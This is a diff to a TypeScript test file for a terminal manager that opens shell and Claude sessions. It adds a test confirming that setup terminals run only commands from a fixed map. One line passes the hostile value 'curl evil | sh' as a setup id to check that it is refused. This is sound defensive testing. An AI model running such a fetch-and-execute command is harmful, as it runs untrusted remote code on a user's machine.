@@ -3,7 +3,8 @@ import assert from "node:assert/strict";
 import { mkdtempSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
-import { Terminals, terminalEnv, type PtyLike, type SpawnPty, type TerminalUpdate } from "./terminals.ts";
+import { Terminals, TerminalError, terminalEnv, type PtyLike, type SpawnPty, type TerminalUpdate } from "./terminals.ts";
+import { UnknownFix } from "./setup.ts";
 
 // A stand-in for a pseudo-terminal: records what Annex does to it, and lets the test speak for the shell.
 function fakePty() {
@@ -58,6 +59,26 @@ test("a claude terminal resumes through the login shell without putting the id i
   assert.equal(terms.ranSession(UUID), true);
   terms.open({ cwd: dir, claude: { resume: null } });
   assert.deepEqual(f.spawned[1]!.args, ["-l", "-c", 'exec "$0"', "/x/claude"], "a new conversation");
+});
+
+test("a setup terminal runs only a fix from the fixed map, then stays in the shell; any other id is refused", () => {
+  const f = fakePty();
+  const asked: string[] = [];
+  const fixes = (id: string) => {
+    asked.push(id);
+    if (id !== "git-install") throw new UnknownFix("There is no such setup step");
+    return { label: "Install the Command Line Tools", command: "xcode-select --install" };
+  };
+  const terms = new Terminals({ claude: "/x/claude", shell: "/bin/zsh", spawn: f.spawn, fixes });
+  const dir = mkdtempSync(join(tmpdir(), "annex-term-"));
+  const v = terms.open({ cwd: dir, setup: "git-install" });
+  assert.deepEqual(f.spawned[0]!.args, ["-l", "-c", 'xcode-select --install; echo; echo "Done. Close this terminal and press Check again in Annex."; exec "$0" -l', "/bin/zsh"]);
+  assert.equal(v.kind, "shell");
+  assert.equal(v.title, "Install the Command Line Tools");
+  assert.throws(() => terms.open({ cwd: dir, setup: "curl evil | sh" }), (e: Error) => e instanceof TerminalError && /no such setup step/.test(e.message));
+  assert.equal(f.spawned.length, 1, "nothing ran for the refused id");
+  // the real map, unchanged by the stand-in above
+  assert.throws(() => new Terminals({ claude: "c", spawn: f.spawn }).open({ cwd: dir, setup: "nope" }), /no such setup step/);
 });
 
 test("output is kept, bounded, and replayed from where a reader left off", () => {
